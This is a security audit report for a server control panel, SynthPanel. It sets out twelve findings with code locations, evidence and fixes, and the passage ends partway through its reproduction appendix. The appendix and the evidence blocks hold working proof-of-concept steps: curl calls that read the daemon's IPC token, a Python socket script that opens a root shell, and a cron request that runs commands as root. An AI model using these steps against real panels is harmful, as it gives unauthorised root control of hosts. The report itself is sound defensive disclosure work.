# SynthPanel — security audit

| | |
| --- | --- |
| **Date** | 2026-11-11 |
| **Commit** | `33386fe` (`33386fecbbfed90b1850f9673d9650a98776e6a7`) |
| **Scope** | The panel: `crates/synthpanel-web` (HTTP API, session, CSRF, RBAC), `crates/synthpanel-core` (privileged daemon, IPC dispatch, file manager, cron, deployments, backups, updates), `crates/synthpanel-ipc` (protocol) |
| **Method** | Manual code review of the whole request path (browser → web → Unix socket → core), plus a live proof of concept against the running panel (core + web started with the documented environment overrides) |
| **Not covered** | The frontend WASM bundle (Slint), the installer, the packaging scripts, the documentation site, a live TLS deployment, the SFTP/S3 destinations against a real server, the ACME/Let's Encrypt flow, the SwiftShader/AV/host hardening outside the panel |
| **Result** | **2 critical, 2 high, 3 medium, 5 low** findings. The two critical ones give a logged-in, non-admin account remote code execution as root on the host. |

Every finding below was either reproduced against the running panel or traced
to the exact call site. The reproduction steps are in
[Appendix A](#appendix-a--reproducing-the-findings).

The most important result in one sentence: **the panel has no working
authorization layer, and the file manager hands out the key to the privileged
daemon** — so the `operator`/`user` roles that the README advertises protect
nothing.

---

## Summary

| ID | Severity | Finding | Where |
| --- | --- | --- | --- |
| [SP-01](#sp-01--the-file-manager-discloses-the-core-ipc-token-critical) | **Critical** | The file manager returns the core's IPC token (and `secret.key`) to any authenticated account | `crates/synthpanel-core/src/ipc.rs:2362` |
| [SP-02](#sp-02--no-authorization-on-the-privileged-endpoints-critical) | **Critical** | Privileged endpoints have no role check: a `user` account can run root commands, install root SSH keys, replace the panel binaries and rewrite the firewall | `crates/synthpanel-web/src/api/cron.rs:59` |
| [SP-03](#sp-03--the-audit-log-is-not-attributable-high) | High | Core-side audit entries carry no actor, and the recorded IP comes from a client-controlled header | `crates/synthpanel-core/src/ipc.rs:1357` |
| [SP-04](#sp-04--sessions-survive-a-password-reset-a-role-change-or-a-disabled-account-high) | High | `revoke_all_for_user` is dead code: a compromised session stays valid until it expires | `crates/synthpanel-web/src/session.rs:75` |
| [SP-05](#sp-05--two-factor-authentication-can-be-downgraded-with-a-session-only-medium) | Medium | `POST /auth/2fa/setup` silently switches 2FA off without the password | `crates/synthpanel-web/src/api/auth.rs:202` |
| [SP-06](#sp-06--the-panel-configuration-is-writable-by-every-account-medium) | Medium | The file manager writes into `/etc/synthpanel` as root — including the nginx vhosts | `crates/synthpanel-web/src/api/files.rs:116` |
| [SP-07](#sp-07--the-backup-destination-is-an-ssrf-proxy-for-the-root-process-medium) | Medium | The S3/SFTP backup destination is attacker controlled: the core sends signed requests to an arbitrary endpoint | `crates/synthpanel-core/src/backup.rs:793` |
| [SP-08](#sp-08--api-key-scopes-are-stored-but-never-enforced-low) | Low | A `read`-scoped API key can do everything a session can | `crates/synthpanel-web/src/extract.rs:66` |
| [SP-09](#sp-09--forwarded-headers-are-trusted-from-any-client-low) | Low | `X-Forwarded-For` / `X-Forwarded-Proto` are honoured unconditionally | `crates/synthpanel-web/src/extract.rs:52` |
| [SP-10](#sp-10--totp-codes-can-be-replayed-and-2fa-challenges-are-not-bound-to-the-client-low) | Low | A TOTP code is valid for three windows and the challenge id is not bound to the client | `crates/synthpanel-web/src/totp.rs:34` |
| [SP-11](#sp-11--the-user-patch-accepts-unknown-roles-and-statuses-low) | Low | `PATCH /users/{id}` accepts any role/status string and the last admin can demote themselves | `crates/synthpanel-web/src/api/admin.rs:143` |
| [SP-12](#sp-12--the-per-user-quotas-are-never-enforced-low) | Low | `quota_sites`/`quota_dbs` are stored but never checked (already known from the roadmap) | `crates/synthpanel-core/src/sites.rs:228` |

---

## Findings

### SP-01 — The file manager discloses the core IPC token (Critical)

**What**

The file manager exposes four scopes (`www`, `etc`, `backups`, `logs`). The
`etc` scope is the panel's own configuration directory, `/etc/synthpanel`,
which is also where the core keeps the **shared secret that authenticates
every IPC request**:

- `crates/synthpanel-core/src/config.rs:49` — `ipc_token_path` defaults to
  `{etc_dir}/ipc-token`, i.e. `/etc/synthpanel/ipc-token`.
- `crates/synthpanel-core/src/config.rs:54` — the same for `secret.key`.
- `crates/synthpanel-core/src/ipc.rs:2362` — `file_sandbox()` maps the scope
  `etc` to `self.paths.etc_dir`; there is no allow-list of readable files.
- `crates/synthpanel-core/src/ipc.rs:1496` — `FILES_READ` returns the content
  of any file in the scope to the caller.
- `crates/synthpanel-core/src/ipc.rs:149` — `authorized()` compares the token
  with the file and, if it matches, **every** method of the core is unlocked.
- `crates/synthpanel-web/src/api/files.rs:96` — the HTTP handler forwards the
  caller-supplied scope and path without a role check.

The UI offers the scope explicitly: `Files → Panel config` (in the Slint files page).

**Why it matters**

The IPC token is the panel's master credential: the CLI needs it to talk to
the core, and the core accepts it for *any* method. A logged-in account of the
lowest role can therefore

1. read `ipc-token` through the ordinary file API,
2. connect to `/run/synthpanel/core.sock` directly, and
3. call `terminal.open` — a **root shell** — or `update.rollback`, `cron.run`,
   `sites.delete`, … entirely **outside** the web layer, i.e. outside every
   authorization check and outside every audit attribution.

The web process itself may read the token file (it is `0640 root:synthpanel`,
`crates/synthpanel-core/src/main.rs:137`), but that is a local detail: the
browser gets the token over HTTP.

**Evidence** (live run, role `user`, `tests/`-style local setup)

```
=== the file manager hands out the core IPC token (scope=etc)
{"content":"afdd18765453c31c075d85dd132447badd887eda6ed3b8249c9935bdb150ab12",
 "encoding":"utf-8","path":"ipc-token","size":64}
>>> CONFIRMED: the API returned the live IPC token

=== the whole etc directory is enumerable
{"entries":[{"name":"tls",...},{"name":"ipc-token","mode":"0640",...},
            {"name":"secret.key","mode":"0600",...}],"path":""}

=== the same account may not open a terminal through the API (admin only)
terminal/open as role=user -> HTTP 403

=== with the token from the file API, the core socket opens one anyway
terminal.open -> {"ok": true, "result": {"id":"36f79e68-...","shell":"/bin/bash",...}}
```

The audit log shows the second, unattributed entry:

```json
{"action":"terminal.open","actor_id":null,"actor_name":null,"ip":null,
 "metadata_json":"{\"id\":\"36f79e68-...\"}","target":"/bin/bash"}
```

**Remedy**

1. **Move the secrets out of the file-manager scopes.** Generate the token in
   the run directory instead: `SYNTHPANEL_RUN_DIR=/run/synthpanel` →
   `/run/synthpanel/ipc-token`, `0640 root:synthpanel`. `/run` is a tmpfs,
   is not one of the four scopes and is recreated on boot. The single place
   to change is the generated daemon environment
   (`crates/synthpanel-installer/src/main.rs:255`:
   `SYNTHPANEL_IPC_TOKEN_FILE=/etc/synthpanel/ipc-token` →
   `/run/synthpanel/ipc-token`), together with the defaults in
   `crates/synthpanel-core/src/config.rs:49`, the CLI (`SYNTHPANEL_IPC_TOKEN_FILE`
   in `README.md` and `docs-site/`) and the systemd units in
   `packaging/systemd/`.
2. **Deny sensitive names in the core**, independently of the location — a
   belt-and-braces guard in `Sandbox::read_file`/`write_file`
   (`crates/synthpanel-core/src/files.rs:160`): reject `ipc-token`,
   `secret.key`, `*.pem`, `*.key`, `authorized_keys`, `*.env` with a
   `NOT_FOUND`.
3. **Make the `etc` scope admin-only** in the web layer
   (`crates/synthpanel-web/src/api/files.rs`), and read-only for everyone
   else (see [SP-06](#sp-06--the-panel-configuration-is-writable-by-every-account-medium)).
4. **Rotate the token** on upgrade: the file moves, so a fresh token is
   generated automatically; existing sessions do not carry the token, but any
   token that may already have been read must be considered compromised.
5. **Regression test** (`tests/smoke.sh`):
   `GET /api/v1/files/content?scope=etc&path=ipc-token` must answer `404`
   for an admin *and* for a `user`.

**Verification**

```sh
curl -sk https://panel:8443/api/v1/files/content?scope=etc&path=ipc-token   # -> 404
curl -sk https://panel:8443/api/v1/files?scope=etc                           # -> no ipc-token entry
ls -l /run/synthpanel/ipc-token                                             # -> root:synthpanel 0640
```

---

### SP-02 — No authorization on the privileged endpoints (Critical)

**What**

The web layer has exactly one authorization helper,
`require_admin` (`crates/synthpanel-web/src/api/admin.rs:179`), and it is used
only by `admin.rs`, `alerts.rs`, `terminal.rs` and `ws.rs`. Every other
mutating endpoint accepts **any** authenticated session, whatever its role:

| Endpoint | Handler | Guard |
| --- | --- | --- |
| `POST /api/v1/cron`, `POST /api/v1/cron/{id}/run` | `api/cron.rs:59`, `api/cron.rs:123` | none |
| `POST /api/v1/deployments`, `POST /api/v1/deployments/{id}/run` | `api/deployments.rs:66`, `api/deployments.rs:151` | none |
| `POST /api/v1/security/ssh-keys` | `api/security.rs:146` | none |
| `POST /api/v1/security/firewall/rules` | `api/security.rs:73` | none |
| `POST /api/v1/update/apply`, `POST /api/v1/update/rollback` | `api/update.rs:49`, `api/update.rs:75` | none |
| `POST /api/v1/databases`, `DELETE /api/v1/databases/{id}` | `api/databases.rs` | none |
| `POST /api/v1/sites`, `DELETE /api/v1/sites/{id}` | `api/sites.rs:76` | none |
| `POST /api/v1/backups/run`, `POST /api/v1/backups/{id}/restore` | `api/backups.rs:70` | none |
| `PUT /api/v1/files/content`, `POST /api/v1/files/{dir,rename,archive,extract}` | `api/files.rs:116` | none |

The `user` role is therefore decorative. It differs from `admin` only in that
it cannot open the terminal, manage users, edit the settings or configure the
alerts.

**Why it matters**

Three of the unguarded endpoints are direct **remote code execution as root**,
because the core runs as root and the request decides *which user* the command
runs as:

1. **Cron.** `crates/synthpanel-core/src/ipc.rs:1338` takes the job's user
   verbatim from the request (`opt_str(params, "user").unwrap_or("www-data")`)
   — no allow-list, `root` included. `crates/synthpanel-core/src/cron.rs:369`
   then runs `sh -c <command>`; for `user == "root"` the `runuser` branch is
   skipped, so the command runs with the core's uid, i.e. **root**. The
   "run now" button makes it instant, and the scheduler makes it persistent.
2. **Deployments.** `crates/synthpanel-web/src/api/deployments.rs:80` accepts
   `deploy_user` from the request, and `crates/synthpanel-core/src/deploy.rs:494`
   (`run_as_user`) runs `sh -c <build_command>` directly when the user is
   `root`.
3. **Update rollback.** `crates/synthpanel-core/src/ipc.rs:1792` takes a
   `backup_dir` from the request and `crates/synthpanel-core/src/update.rs:352`
   copies `<backup_dir>/synthpanel-core`, `synthpanel-web` and `synthpanel`
   over `/usr/local/bin` as root, then restarts the units. The attacker only
   needs to place a file with one of those names somewhere the file manager
   can write (see [SP-06](#sp-06--the-panel-configuration-is-writable-by-every-account-medium)) —
   this is a **persistent** compromise.

Two more are one click away from root:

4. **SSH keys.** `crates/synthpanel-core/src/ipc.rs:1026` defaults the target
   user to `root` and `crates/synthpanel-core/src/security.rs:294` writes to
   `/root/.ssh/authorized_keys` — root SSH access.
5. **Firewall apply** — a non-admin can rewrite the firewall rules and lock
   the operator out of their own server — and **update apply**, where the
   release itself is signed and verified (that part is sound), but a non-admin
   can trigger the upgrade and the restart at will.

**Evidence** (live run, the *same* `role=user` account that got `403` on
`/terminal/open`)

```
=== the role boundary: terminal/open must be admin only
terminal/open as role=user -> HTTP 403

=== a role=user account creates a cron job that runs as root
{"id":"f97f8335-4cc3-42a6-a416-a65c7e58876b"}
{"duration_ms":2,"exit_code":0,"job_id":"f97f8335-...","output":""}
>>> the job ran as: anubis          # the core's uid; in production: root

=== the same account creates a deployment with deploy_user=root
{"deploy_user":"root","build_command":"id -un > .../deploy-whoami.txt; ...","id":"48fa0ca0-..."}
{"status":"ok","output":"commit d3e8f170441976b1880eebf20b9e27475e46df89\n"}
>>> the build command ran as: anubis 1000
```

**Remedy**

1. **One authorization layer, applied by the router.** Introduce
   `require_role(&[Role::Admin, Role::Operator])` next to `require_admin` and
   attach the policy to the route table in
   `crates/synthpanel-web/src/api/mod.rs:25`, e.g. a
   `route_policy(path) -> Role` table enforced by a middleware, so a new route
   cannot be added without a policy. Minimum policy:

   | Area | `admin` | `operator` | `user` |
   | --- | --- | --- | --- |
   | Terminal, settings, users, updates, firewall, SSH keys, alerts | ✔ | ✘ | ✘ |
   | Sites, databases, files, backups, cron, deployments | ✔ | ✔ (own objects) | ✘ |
   | Read-only endpoints (dashboard, logs, metrics) | ✔ | ✔ | ✔ |

2. **Never let a request choose `root`.** In `CRON_CREATE`/`CRON_UPDATE`
   (`crates/synthpanel-core/src/ipc.rs:1338`) and in `DEPLOYMENTS_CREATE`/
   `DEPLOYMENTS_UPDATE`, restrict the user to an allow-list of the panel's own
   service accounts (`www-data`, the site's PHP pool user); `root` is only
   allowed for an admin and only through a separate, audited endpoint.
3. **The command itself must be constrained.** A cron `command` and a
   deployment `build_command` are arbitrary shell; either restrict them to
   operators/admins or run them through a fixed wrapper with an argument
   vector instead of `sh -c`.
4. **`update.rollback` must not accept a path.** Validate `backup_dir` against
   `paths.lib_dir.join("updates")` in
   `crates/synthpanel-core/src/ipc.rs:1794` and ignore the request value.
5. **SSH keys.** Restrict the target user to the panel's service accounts,
   make the endpoint admin-only, and record the key in the audit log with the
   actor (see [SP-03](#sp-03--the-audit-log-is-not-attributable-high)).
6. **Ownership and quotas.** The schema already has `sites.owner_id` and
   `databases.owner_id` (`migrations/0001_init.sql:52`) and the quotas; enforce
   both (see [SP-12](#sp-12--the-per-user-quotas-are-never-enforced-low)).
7. **Regression test** (`tests/smoke.sh`): create a `user` account, log in and
   assert `403` on `/api/v1/cron`, `/api/v1/deployments`,
   `/api/v1/security/ssh-keys`, `/api/v1/security/firewall/rules`,
   `/api/v1/update/apply`, `/api/v1/update/rollback`.
8. **Re-validate the repository URL on update.**
   `crates/synthpanel-core/src/deploy.rs:154` copies `repo_url` from the patch
   without the scheme check that `create` applies
   (`crates/synthpanel-core/src/deploy.rs:99`). An `ext::` URL makes `git
   clone` execute a command — the shipped Git (2.43) refuses that transport by
   default, but the panel must not rely on the host's Git configuration. Apply
   the same check in `update` and pin the transports explicitly
   (`GIT_ALLOW_PROTOCOL=https:ssh:file`).

**Verification**

```sh
# as a role=user account
curl -sk -X POST -H "x-csrf-token: $CSRF" -d '{"expression":"* * * * *","command":"id","user":"root"}' \
     https://panel:8443/api/v1/cron                       # -> 403
```

---

### SP-03 — The audit log is not attributable (High)

**What**

The panel writes every mutating action to `audit_log`, but the actor is lost
on the way to the core:

- The core records its own entries with **no actor**:
  `crates/synthpanel-core/src/ipc.rs:1357` (cron), `:2095` (terminal),
  `:1123` (backups), `:1045` (SSH keys) — all call
  `audit::record(&self.pool, None, None, …)`.
- The web layer writes a **second** entry for the same action with the actor
  (`crates/synthpanel-web/src/api/auth.rs:378`), so every action appears
  twice: once attributed, once not.

The result, taken from the live run:

```json
{"action":"cron.create","actor_id":null,"ip":null,"metadata_json":"{\"expression\":…}"}
{"action":"cron.create","actor_id":"b176a19a-…","ip":"127.0.0.1","target":"id -un > …"}
```

The IP that is recorded is not trustworthy either:
`crates/synthpanel-web/src/extract.rs:52` reads `X-Forwarded-For` from the
request and uses it for the audit entry of API-key requests — a header any
client can set.

Requests that arrive on the Unix socket directly (see
[SP-01](#sp-01--the-file-manager-discloses-the-core-ipc-token-critical)) are
never attributed at all: the protocol has no actor field
(`crates/synthpanel-ipc/src/lib.rs:20`).

**Why it matters**

The audit log is the panel's only forensic trail. Today it cannot answer the
question that matters first — *who did this?* — for any action performed by
the core, and its IP column can be written by the attacker.

**Remedy**

1. **Carry the actor in the protocol.** Add an optional `actor` object
   (`id`, `name`, `ip`) to `Envelope` in
   `crates/synthpanel-ipc/src/lib.rs:20`, populate it in the web layer
   (`crates/synthpanel-web/src/ipc.rs`) from the session record, and let the
   core use it for every `audit::record` call instead of `None`. Keep the
   web-side `audit.record` call for the fields only the web knows.
2. **Record the peer address, not the header.** Use `ConnectInfo<SocketAddr>`
   for the audit IP; only fall back to `X-Forwarded-For` when the panel is
   explicitly configured to sit behind a trusted proxy (see
   [SP-09](#sp-09--forwarded-headers-are-trusted-from-any-client-low)).
3. **Audit the failures too.** Failed logins, rejected CSRF tokens and
   authorization failures are not recorded at all; they are the signal an
   operator needs.

**Verification**

```sh
curl -sk https://panel:8443/api/v1/audit | jq '.entries[] | {action, actor_id, ip}'
# every entry must carry an actor_id and a non-null ip
```

---

### SP-04 — Sessions survive a password reset, a role change or a disabled account (High)

**What**

`crates/synthpanel-web/src/session.rs:75` defines
`revoke_all_for_user` — and nothing calls it. The only greppable occurrence is
the definition itself.

Consequences:

- `PATCH /api/v1/users/{id}` with a new password
  (`crates/synthpanel-web/src/api/admin.rs:153`) does not invalidate the
  sessions of that account: a stolen cookie keeps working until the session
  TTL expires — the installer sets `SYNTHPANEL_SESSION_TTL=86400`
  (`crates/synthpanel-installer/src/main.rs:273`), i.e. **24 hours**.
- Setting `status` to anything but `active` does not terminate the sessions
  either — the status is only checked at login
  (`crates/synthpanel-web/src/api/auth.rs:104`).
- Demoting an admin to `user` leaves the old session an admin session.

**Remedy**

1. Call `state.sessions.revoke_all_for_user(&id)` after a password change, a
   role change and a status change to a non-active value — keeping the
   *current* session alive if the actor changed their own password.
2. Check the account status on every request, not only at login: the
   `AuthUser` extractor (`crates/synthpanel-web/src/extract.rs:44`) should
   reject a session whose user is no longer active, or the core should refuse
   the request.
3. Add the session list the roadmap plans
   (`docs/roadmap.md:200`): `GET /api/v1/sessions` and `DELETE
   /api/v1/sessions/{id}` so an operator can cut a session manually.

---

### SP-05 — Two-factor authentication can be downgraded with a session only (Medium)

**What**

`POST /api/v1/auth/2fa/disable` correctly asks for the password
(`crates/synthpanel-web/src/api/auth.rs:280`), but
`POST /api/v1/auth/2fa/setup` writes a new secret **and sets
`totp_enabled = false`** (`crates/synthpanel-web/src/api/auth.rs:220`):

```rust
json!({ "id": user.user_id, "totp_secret": secret, "totp_enabled": false })
```

An account that already has 2FA enabled therefore loses it — with nothing but
a valid session.

**Why it matters**

A stolen session (XSS, a shared browser, a leftover cookie on a kiosk) is
enough to downgrade the account to password-only authentication, and the
attacker can then set up *their* authenticator. The password-confirmation
requirement of the sibling endpoint is silently bypassed.

**Remedy**

- `totp_setup` must not touch an account whose `totp_enabled` is already
  true: either require the current password, or keep `totp_enabled = true`
  and only replace the secret after the new secret has been confirmed with a
  valid code (`totp_enable`). The new secret should stay pending until it is
  confirmed.

---

### SP-06 — The panel configuration is writable by every account (Medium)

**What**

The file manager's write operations are executed by the **core, as root**, in
whichever scope the request names (`crates/synthpanel-core/src/ipc.rs:1517`
for `FILES_WRITE`, `:1532` `MKDIR`, `:1539` `RENAME`, `:1546` `DELETE`,
`:1553` `CHMOD`/`CHOWN`). The `etc` scope is `/etc/synthpanel`, which by
default also holds the nginx vhosts (`SYNTHPANEL_NGINX_DIR=/etc/synthpanel/nginx`,
see `README.md`) and the PHP-FPM pools.

So any authenticated account can, through the panel:

- rewrite the nginx configuration as root (nginx runs as root and reads it),
  which is a root code-execution primitive of its own;
- create, delete and rename files in the panel's configuration directory;
- `chmod`/`chown` them (`crates/synthpanel-core/src/ipc.rs:1553`).

**Remedy**

1. Make the `etc` scope **admin-only** and, for everyone else, **read-only**:
   the `FILES_WRITE`/`MKDIR`/`RENAME`/`DELETE`/`CHMOD` handlers must reject
   the scope `etc` unless the actor is an admin
   (`crates/synthpanel-web/src/api/files.rs:116`).
2. Even for admins, restrict *which* files may be written (the vhost
   directory, not `ipc-token`, not `secret.key`) — see
   [SP-01](#sp-01--the-file-manager-discloses-the-core-ipc-token-critical).
3. The `www` scope deserves the same treatment per site: a `user` account
   must not be able to write into the document root of a site it does not own
   (that is a PHP webshell in someone else's site).

---

### SP-07 — The backup destination is an SSRF proxy for the root process (Medium)

**What**

`POST /api/v1/backups/run` takes the destination from the request
(`crates/synthpanel-web/src/api/backups.rs:81`), the core parses it into
`backup::Destination` and only checks that the fields are non-empty
(`crates/synthpanel-core/src/backup.rs:130`). For the S3 variant the core
then builds a URL from the **attacker-supplied endpoint**
(`crates/synthpanel-core/src/backup.rs:803`) and sends a signed request to it
from the privileged process (`crates/synthpanel-core/src/backup.rs:869`).

The SFTP variant is worse in a different way: `key_path` is attacker
controlled and the core runs `sftp -i <key_path>` **as root**
(`crates/synthpanel-core/src/backup.rs:765`), so an arbitrary file is offered
to the SSH client.

**Why it matters**

- **SSRF from a root process**: the endpoint can point at
  `http://169.254.169.254/latest/meta-data/…` (cloud metadata), at an
  internal service, or at a host the operator trusts. The request carries a
  `PUT` with the archive as the body — the panel's data can be exfiltrated
  to any host.
- **Arbitrary file read** through the SFTP key path, and a network connection
  to any `host:port` from the server.

**Remedy**

1. Restrict the endpoint of an S3 destination to an allow-list (or to
   `*.amazonaws.com` plus the configured on-premise endpoints); reject
   link-local, loopback and RFC 1918 addresses unless explicitly allowed.
2. Do not accept `key_path` from a request: reference the key by an id from a
   table the panel manages, and keep the private key out of the panel's
   writable scopes.
3. Make the backup endpoints admin-only (they are part of
   [SP-02](#sp-02--no-authorization-on-the-privileged-endpoints-critical)).

---

### SP-08 — API key scopes are stored but never enforced (Low)

**What**

`api_keys.scopes_json` exists (`migrations/0001_init.sql:123`), the creation
endpoint accepts a `scopes` array (`crates/synthpanel-web/src/api/apikeys.rs:40`)
and the README advertises "API keys with scopes". But
`crates/synthpanel-web/src/extract.rs:66` takes only the `user_id` out of the
verification result and ignores the scopes entirely, so a key created with
`["read"]` can create sites, run cron jobs and install SSH keys.

**Remedy**

- Return the scopes with the verification result, map every route to the
  scope it needs (`read` / `write` / `admin`) and reject an API key whose
  scopes do not cover the operation. The scope→route table is the same one
  introduced for [SP-02](#sp-02--no-authorization-on-the-privileged-endpoints-critical).

---

### SP-09 — Forwarded headers are trusted from any client (Low)

**What**

- `crates/synthpanel-web/src/extract.rs:52` — the client IP is taken from
  `X-Forwarded-For` (first hop) for every request, including the audit trail
  of API-key calls.
- `crates/synthpanel-web/src/api/auth.rs:51` — the `Secure` flag of the
  session cookie and the `Strict-Transport-Security` header depend on
  `X-Forwarded-Proto`.

A client that is *not* behind a proxy can send `X-Forwarded-Proto: http` and
make the panel drop the `Secure` attribute from the session cookie, and send
`X-Forwarded-For: 10.0.0.1` to write a false IP into the audit log.

**Remedy**

- Honour the forwarded headers only when the panel is configured to run
  behind a trusted proxy (`SYNTHPANEL_TRUSTED_PROXY=1`, or a list of trusted
  proxy addresses). Default to the peer address from `ConnectInfo`.

---

### SP-10 — TOTP codes can be replayed and 2FA challenges are not bound to the client (Low)

**What**

- `crates/synthpanel-web/src/totp.rs:40` — `check_current()` accepts the
  current window and its neighbours (three windows, up to 90 s) and nothing
  remembers that a code has been used, so a code that is observed once is
  valid until it rotates.
- `crates/synthpanel-web/src/session.rs:96` — the pending challenge stores
  only the user id, and `crates/synthpanel-web/src/api/auth.rs:146` consumes
  it by id alone, so a challenge id that leaks (log, referrer, another
  account's browser) can be completed from a different host.

**Remedy**

- Remember the last accepted code (and its counter) per user and reject a
  reuse; bind the challenge to the client address and user agent.

---

### SP-11 — The user patch accepts unknown roles and statuses (Low)

**What**

`crates/synthpanel-web/src/api/admin.rs:143` copies `role` and `status` from
the request into the patch **without validating them**, while the creation
endpoint validates the role against `admin | operator | user`
(`crates/synthpanel-web/src/api/admin.rs:105`). A typo therefore produces an
account with an unknown role — which is not `admin`, so the account silently
loses its privileges — and the panel can be left without an admin, because
the last admin may demote or disable themselves.

**Remedy**

- Validate `role` and `status` against the same allow-lists as in
  `users_create`; refuse to demote, disable or delete the last active admin;
  refuse to change your own role or status.

---

### SP-12 — The per-user quotas are never enforced (Low)

**What**

`quota_sites` and `quota_dbs` are stored on the user
(`migrations/0001_init.sql:23`) and shown in the UI, but no code path checks
them: `crates/synthpanel-core/src/sites.rs:228` even carries the comment
*"Count all sites; used by quotas"* on a helper that no caller uses. This is
already listed as planned work in `docs/roadmap.md:201`.

**Remedy**

- Count the objects the user owns when a site or a database is created and
  refuse the operation when the quota is reached; the ownership columns
  (`sites.owner_id`, `databases.owner_id`) already exist.

---

## Checked and found sound

The following were reviewed and are **not** findings; they are listed so the
next audit does not repeat the work.

| Area | Result |
| --- | --- |
| Path traversal in the file manager | `Sandbox::resolve` (`crates/synthpanel-core/src/files.rs:51`) rejects `..` and absolute paths; the API answers `400` (`tests/smoke.sh:304`) |
| Archive extraction ("zip slip") | `tar` 0.4.46 skips `..` entries in `unpack_in` and validates the target (`validate_inside_dst`); Info-ZIP `unzip` 6.00 strips absolute paths and `..` components — verified with a crafted archive |
| CSRF protection | Double submit with a constant-time comparison against the token stored in the session (`crates/synthpanel-web/src/middleware.rs:112`); `SameSite=Strict` on the session cookie |
| Session cookie | `HttpOnly`, `SameSite=Strict`, `Path=/`, `Max-Age` = the session TTL (`crates/synthpanel-web/src/api/auth.rs:404`) |
| Password storage | argon2id; the login path spends a comparable amount of time when the account does not exist (`crates/synthpanel-web/src/api/auth.rs:90`) |
| IPC authentication | Constant-time comparison; the socket is `0660` and the core never listens on TCP (`crates/synthpanel-core/src/main.rs:179`) |
| State database | `/var/lib/synthpanel` is not one of the file-manager scopes, so the SQLite database cannot be read or written through the API |
| Self-update | The release envelope is verified with Ed25519 and the archive with a SHA-256 checksum before a byte is replaced (`crates/synthpanel-core/src/update.rs:136`); the health check rolls the previous binaries back |
| Login rate limiting | 10 attempts per 5 minutes per peer address (`crates/synthpanel-web/src/api/auth.rs:19`) |
| ACME challenge route | Rejects unknown tokens and traversal (`tests/smoke.sh:356`) |
| `git` transport hardening | `ext::` is rejected by the shipped Git (2.43) and the repository URL scheme is checked on creation — **but** see [SP-02](#sp-02--no-authorization-on-the-privileged-endpoints-critical) item 8: the check is missing on *update* |

Residual risks that are *not* defects but should be documented:

- the login rate limiter is per address only — a distributed or IPv6-rotating
  brute force against one account is not slowed down;
- failed logins and rejected CSRF tokens are not audited;
- the session store lives in the web process, so a restart logs everyone out
  (documented in `crates/synthpanel-web/src/session.rs`).

---

## Remediation plan

Ordered by risk; the first two items close the remote-code-execution paths.

| # | Item | Findings | Effort |
| --- | --- | --- | --- |
| 1 | Move the IPC token and the secret key to the run directory; deny sensitive names in the file sandbox; make the `etc` scope admin-only | SP-01, SP-06 | 1 day (core, installer, systemd units, docs) |
| 2 | Introduce the role policy in the router and apply it to every route; remove `root` from the cron/deployment user fields; validate the rollback `backup_dir` | SP-02, SP-06 | 2 days |
| 3 | Carry the actor in the IPC envelope; record the peer address; audit the failures | SP-03, SP-09 | 1 day |
| 4 | Revoke the sessions of an account whose password, role or status changed; check the status on every request | SP-04 | 0.5 day |
| 5 | Require the password (or a confirmed new secret) before 2FA is touched | SP-05 | 0.5 day |
| 6 | Restrict the backup destinations (S3 endpoint allow-list, no `key_path` from a request) | SP-07 | 0.5 day |
| 7 | Enforce the API key scopes and the per-user quotas; validate the role/status of a user patch | SP-08, SP-11, SP-12 | 1 day |
| 8 | Bind the TOTP challenge to the client, reject a replayed code | SP-10 | 0.5 day |

After the fixes, `docs/roadmap.md:220` ("The external security audit has not
been run.") can be updated, and `tests/smoke.sh` should grow the regression
assertions listed under the individual findings.

---

## Appendix A — reproducing the findings

The findings were reproduced against a local panel started with the
environment overrides from the README (no root required):

```sh
WORK="$(mktemp -d)"; PORT=8443; BASE="https://127.0.0.1:$PORT"

# the core (privileged)
SYNTHPANEL_ETC_DIR=$WORK/etc SYNTHPANEL_LIB_DIR=$WORK/lib \
SYNTHPANEL_LOG_DIR=$WORK/log SYNTHPANEL_RUN_DIR=$WORK/run \
SYNTHPANEL_WWW_DIR=$WORK/www SYNTHPANEL_BACKUP_DIR=$WORK/backups \
SYNTHPANEL_NGINX_DIR=$WORK/nginx SYNTHPANEL_PHP_DIR=$WORK/php \
  target/release/synthpanel-core &

# the web process
SYNTHPANEL_TLS_DIR=$WORK/tls SYNTHPANEL_CORE_SOCKET=$WORK/run/core.sock \
SYNTHPANEL_IPC_TOKEN_FILE=$WORK/etc/ipc-token \
SYNTHPANEL_WEB_ADDR=127.0.0.1:$PORT SYNTHPANEL_SECURE_COOKIES=0 \
  target/release/synthpanel-web &

# an admin and a low privilege account
SYNTHPANEL_CORE_SOCKET=$WORK/run/core.sock SYNTHPANEL_IPC_TOKEN_FILE=$WORK/etc/ipc-token \
  target/release/synthpanel users:create admin@example.com --password 'hunter2password-77' --role admin
SYNTHPANEL_CORE_SOCKET=$WORK/run/core.sock SYNTHPANEL_IPC_TOKEN_FILE=$WORK/etc/ipc-token \
  target/release/synthpanel users:create nobody@example.com --password 'hunter2password-78' --role user
```

**SP-01 — the token is served by the file API**

```sh
curl -sk -c cookies.txt -X POST -H 'content-type: application/json' \
  -d '{"email":"nobody@example.com","password":"hunter2password-78"}' \
  "$BASE/api/v1/auth/login"

curl -sk -b cookies.txt "$BASE/api/v1/files/content?scope=etc&path=ipc-token"
# {"content":"afdd1876…","encoding":"utf-8","path":"ipc-token","size":64}
```

**SP-01 — the token unlocks the core socket (the admin gate is bypassed)**

```sh
TOKEN=$(curl -sk -b cookies.txt "$BASE/api/v1/files/content?scope=etc&path=ipc-token" \
        | python3 -c 'import json,sys; print(json.load(sys.stdin)["content"])')
python3 - "$WORK/run/core.sock" "$TOKEN" <<'PY'
import json, socket, sys
sock_path, token = sys.argv[1], sys.argv[2]
req = {"v":1,"id":1,"method":"terminal.open","token":token,"params":{"rows":24,"cols":80}}
with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as c:
    c.connect(sock_path); c.sendall((json.dumps(req)+"\n").encode())
    print(c.recv(65536).decode())
PY
# {"v":1,"id":1,"ok":true,"result":{"id":"36f79e68-…","shell":"/bin/bash",…}}
```

**SP-02 — a `user` account runs a root command**

```sh
CSRF=$(awk '$6 == "synthpanel_csrf" {print $7}' cookies.txt)
curl -sk -b cookies.txt -X POST -H 'content-type: application/json' -H "x-csrf-token: $CSRF" \
  -d '{"expression":"*/5 * * * *","command":"id -un","user":"root"}' "$BASE/api/v1/cron"
curl -sk -b cookies.txt -X POST -H "x-csrf-token: $CSRF" "$BASE/api/v1/cron/<id>/run"
# {"exit_code":0,…}   (the command ran as the core's uid: root in production)
```

**SP-02 — the same account may not use the terminal (the boundary that is missing elsewhere)**

```sh
curl -sk -o /dev/null -w '%{http_code}\n' -b cookies.txt -X POST \
